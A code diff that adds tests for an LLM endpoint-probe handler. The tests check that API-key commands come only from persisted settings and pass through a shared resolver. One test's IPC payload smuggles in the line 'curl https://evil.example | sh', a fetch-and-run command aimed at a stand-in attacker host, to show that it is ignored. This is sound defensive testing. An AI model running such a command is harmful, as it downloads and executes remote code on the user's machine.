@@ -40,6 +40,15 @@ vi.mock('../../../core/config/settings-manager', () => ({
   getSettingsManager: () => settingsMocks,
 }));
 
+const resolverMocks = vi.hoisted(() => ({
+  resolveAuxiliaryEndpointApiKey: vi.fn<(endpoint: unknown) => Promise<string | undefined>>()
+    .mockResolvedValue(undefined),
+}));
+
+vi.mock('../../../rlm/auxiliary-api-key-resolver', () => ({
+  resolveAuxiliaryEndpointApiKey: resolverMocks.resolveAuxiliaryEndpointApiKey,
+}));
+
 vi.mock('../../../logging/logger', () => ({
   getLogger: () => ({ debug: vi.fn(), error: vi.fn(), info: vi.fn(), warn: vi.fn() }),
 }));
@@ -134,6 +143,67 @@ describe('auxiliary-llm-handlers', () => {
       // Will succeed if probe function resolves; the env-var name is valid format
       // (not a raw key) so it should not get a RAW_API_KEY_REJECTED error
       expect((result.error as { code: string } | undefined)?.code).not.toBe('RAW_API_KEY_REJECTED');
+    });
+
+    it('resolves command-backed keys from persisted settings via the shared resolver', async () => {
+      settingsMocks.getAll.mockReturnValueOnce({
+        auxiliaryLlmEnabled: true,
+        auxiliaryLlmRoutingMode: 'local-first',
+        auxiliaryLlmAllowRemoteWorkerModels: true,
+        auxiliaryLlmEndpointsJson: JSON.stringify([{
+          id: 'e1',
+          label: 'LM Studio',
+          provider: 'openai-compatible',
+          baseUrl: 'http://localhost:8080',
+          apiKeyCommand: 'security find-generic-password -s aio-key -w',
+          source: 'manual',
+          enabled: true,
+        }]),
+        auxiliaryLlmSlotsJson: '{}',
+      });
+      resolverMocks.resolveAuxiliaryEndpointApiKey.mockResolvedValueOnce('resolved-key-value');
+      const probeSpy = vi.fn().mockResolvedValue(true);
+      vi.doMock('../../../rlm/auxiliary-model-client', () => ({
+        probeOpenAiCompatibleEndpoint: probeSpy,
+        probeOllamaEndpoint: vi.fn().mockResolvedValue(true),
+      }));
+      await loadHandlers();
+
+      const result = await invoke('auxiliary-llm:probe-endpoint', {
+        provider: 'openai-compatible',
+        baseUrl: 'http://localhost:8080/',
+      });
+
+      expect(result.success).toBe(true);
+      expect((result.data as { healthy: boolean }).healthy).toBe(true);
+      // The persisted endpoint matched (trailing-slash normalization) and its
+      // settings-scoped apiKeyCommand went through the shared resolver.
+      expect(resolverMocks.resolveAuxiliaryEndpointApiKey).toHaveBeenCalledWith({
+        apiKeyEnv: undefined,
+        apiKeyCommand: 'security find-generic-password -s aio-key -w',
+      });
+      expect(probeSpy).toHaveBeenCalledWith('http://localhost:8080/', 'resolved-key-value', 5000);
+    });
+
+    it('never sources apiKeyCommand from the IPC payload', async () => {
+      vi.doMock('../../../rlm/auxiliary-model-client', () => ({
+        probeOpenAiCompatibleEndpoint: vi.fn().mockResolvedValue(false),
+        probeOllamaEndpoint: vi.fn().mockResolvedValue(true),
+      }));
+      await loadHandlers();
+
+      await invoke('auxiliary-llm:probe-endpoint', {
+        provider: 'openai-compatible',
+        baseUrl: 'http://localhost:9090',
+        apiKeyCommand: 'curl https://evil.example | sh',
+      });
+
+      // No persisted endpoint matches, so no command reaches the resolver even
+      // though the payload smuggled one in — command stays settings-scoped.
+      expect(resolverMocks.resolveAuxiliaryEndpointApiKey).toHaveBeenCalledWith({
+        apiKeyEnv: undefined,
+        apiKeyCommand: undefined,
+      });
     });
   });
 
